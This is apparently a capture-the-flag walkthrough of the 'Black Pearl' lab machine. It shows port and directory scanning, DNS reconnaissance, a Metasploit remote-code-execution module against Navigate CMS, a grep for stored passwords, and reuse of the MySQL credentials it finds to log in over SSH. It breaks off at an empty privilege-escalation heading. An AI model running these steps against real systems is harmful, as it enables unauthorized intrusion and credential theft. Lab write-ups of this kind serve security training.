# Black Pearl machine walkthrough
Starting with nmap scan.

![nmap](https://github.com/moataz-bellah/writeups/assets/47069499/d82feffd-c461-4903-bd3b-52957d253583)

Ok, we have three ports open, 22, 53, 80 for ssh, dns, and http. Start with http and see what it has. Let's search for any usful directories.  

```
ffuf -u http://192.168.0.106/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ
secret
```
Great, we got 'secret'. Let's see it.

![secret](https://github.com/moataz-bellah/writeups/assets/47069499/6a7a2856-9bcc-4fa9-ba4b-0c725923593e)

Ok, we may have a potential username "Alek". Nothing else on this site. Let's move to port 53 which is dns.

```
sudo dnsrecon -r 127.0.0.0/24 -n 192.168.0.106
```

This command will look for internal sites inside dns server.

![dns_recon](https://github.com/moataz-bellah/writeups/assets/47069499/898e0e7a-f6c7-4420-9761-230e86ffb25e)

Yes, found something interesting 'blackpearl.tcm'. To access it, we need to add it to /etc/hosts like that.

```
192.168.0.106   blackpearl.tcm
```

Good, let's visit http://blackpearl.tcm

![php](https://github.com/moataz-bellah/writeups/assets/47069499/92d1f44d-e4df-4809-9b84-cd9fafab161d)

It is a php configuration page. Let's do some directory busting again, but on http://blackpearl.tcm this time.

```
ffuf -u http://blackpearl.tcm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ
navigate
```
Great, we got navigate. Let's see it.

![navigate](https://github.com/moataz-bellah/writeups/assets/47069499/2f63b25c-d4ca-4fd9-9c13-4265c1d9422c)

I tried sql injection, but it didn't work. So, let's search online for any exploit for navigatecms, and i found that https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/
Great, metasploit has exploit for it. Opening metasploit.

```
use exploit/multi/http/navigate_cms_rce
set RHOSTS http://blackpearl.tcm
exploit
```

![metasploit](https://github.com/moataz-bellah/writeups/assets/47069499/06860344-fb8b-470f-8394-8f8915724f2c)

Great, we are in. We have user www-data. Let's discover the files of that site.

![ls](https://github.com/moataz-bellah/writeups/assets/47069499/cf82dd6d-bf44-47e5-aa77-0c8b7cbaf42f)

I want to search in all files for word "password" to see, if can find credentials.

```
grep  -r 'password*' navigate/*  --exclude='*.css' --exclude='*.js' --exclude-dir='lib' --exclude-dir='js' | cut -d: -f1
```
- -r  search in subdirectories
- navigate/* all files inside navigate folder
- --exclude  igonre files of spacific type
- --exclude-dir ignore spacific directories from search

This command will search in all files and dirs inside navigate folder except files of type .css and .js and dirs 'lib' and 'js'. I ignored these files becuase they are not useful.  

![grep](https://github.com/moataz-bellah/writeups/assets/47069499/471aeb3d-d8bc-4b89-bb65-3b5e681508a5)

We have a lot of duplicates. we can filter tham by adding a small part.

```
grep  -r 'password*' navigate/*  --exclude='*.css' --exclude='*.js' --exclude-dir='lib' --exclude-dir='js' | cut -d: -f1 | sort | uniq
```

After removing duplicates

```
navigate/cfg/globals.php
navigate/login.php
navigate/web/nvweb_xmlrpc.php
```

We have a lot of files that have 'password' inside. Exploring them, i found that navigate/cfg/globals.php has mysql credentials.

```
define('PDO_HOSTNAME', "localhost");
define('PDO_PORT',     "3306");
define('PDO_SOCKET',   "");
define('PDO_DATABASE', "navigate");
define('PDO_USERNAME', "alek");
define('PDO_PASSWORD', "H4x0r");
define('PDO_DRIVER',   "mysql");
```
Let's try to login to ssh using that credential.

![ssh](https://github.com/moataz-bellah/writeups/assets/47069499/3d913e9e-d540-4fb7-af1b-941f95666054)

Great, now we are alek.

# Privilege Escalation

